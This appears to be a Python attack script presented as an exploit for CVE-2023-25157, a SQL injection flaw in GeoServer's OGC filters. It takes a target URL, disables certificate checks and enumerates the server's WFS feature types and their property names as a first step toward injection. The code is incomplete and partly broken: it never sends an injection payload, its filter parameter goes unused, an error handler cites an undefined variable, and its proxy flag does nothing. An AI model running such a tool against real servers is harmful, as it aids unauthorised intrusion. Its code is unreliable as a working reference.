#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import requests
import sys
import xml.etree.ElementTree as ET
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
BOLD = '\033[1m'
ENDC = '\033[0m'


class GeoServerSQLI():
    
    def __init__(self,url):        
        self.url=url 

    def getFeatures(self):
        try:
            response = requests.get(self.url + "/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities", verify=False)
            response.raise_for_status()
            if(response.status_code == 200):
                root = ET.fromstring(response.text)
                feature_types = root.findall('.//{http://www.opengis.net/wfs}FeatureType')
                namesFeatures = [feature_type.findtext('{http://www.opengis.net/wfs}Name') for feature_type in feature_types]
                return namesFeatures
            else:
                print(f"{RED}Failed to retrieve XML data{ENDC}")
                return None

        except requests.exceptions.RequestException as e:
            print(f"{RED}Failed to retrieve XML data: {e}{ENDC}")
            sys.exit(1)

    def getProperties(self,namesFeatures,ql_filters="strStartsWith"):
        
        for name in namesFeatures:
            try:
                endpoint = f"/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName={name}&maxFeatures=1&outputFormat=json"
                response = requests.get(self.url + endpoint, verify=False)
                response.raise_for_status()  

                try:
                    json_data = response.json()
                    properties = json_data['features'][0]['properties']
                    property_names = list(properties.keys())

                    for property_name in property_names:
                        print(f"- {property_name}")
                    print(f"\n{GREEN}Available Properties for {name}:{ENDC}")
                
                
                except json.JSONDecodeError:
                    print(f"{RED}Failed to parse JSON response for {name} with CQL_FILTER: {cql_filter}{ENDC}")
                    continue 

            except requests.exceptions.RequestException as e:
                pass

def arguments():
    parser = argparse.ArgumentParser(description="GeoServer OGC Filter SQL Injection Vulnerabilities Exploit")
    parser.add_argument("url", type=str, help="URL of the target GeoServer")
    parser.add_argument("--proxy", action="store_true", help="Enable proxy (default: False)")
    return parser.parse_args()

def main():
    args = arguments()
    CVE_2023_25157 = GeoServerSQLI(args.url)
    namesFeatures = CVE_2023_25157.getFeatures()
    if(namesFeatures):
        CVE_2023_25157.getProperties(namesFeatures)


    
    

    

if __name__ == "__main__":
    main()
